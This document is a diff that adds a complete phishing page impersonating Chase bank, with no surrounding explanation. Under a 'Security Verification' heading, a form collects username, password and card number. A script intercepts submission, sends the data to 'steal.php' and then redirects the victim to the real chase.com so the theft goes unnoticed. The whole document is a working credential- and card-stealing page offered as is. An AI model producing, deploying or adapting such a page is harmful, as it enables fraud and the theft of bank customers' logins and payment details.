@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html><head><title>Chase</title></head><body>
+<h2>Chase Security Verification</h2>
+<form id="login">
+<input name="user" placeholder="Username">
+<input name="pass" type="password">
+<input name="card" placeholder="Card Number">
+<button>Verify</button>
+</form>
+<script>
+document.getElementById('login').onsubmit=e=>{
+  e.preventDefault()
+  fetch('steal.php',{method:'POST',body:new FormData(e.target)})
+    .then(()=>location.href='https://www.chase.com')
+}
+</script>
+</body>
+</html>
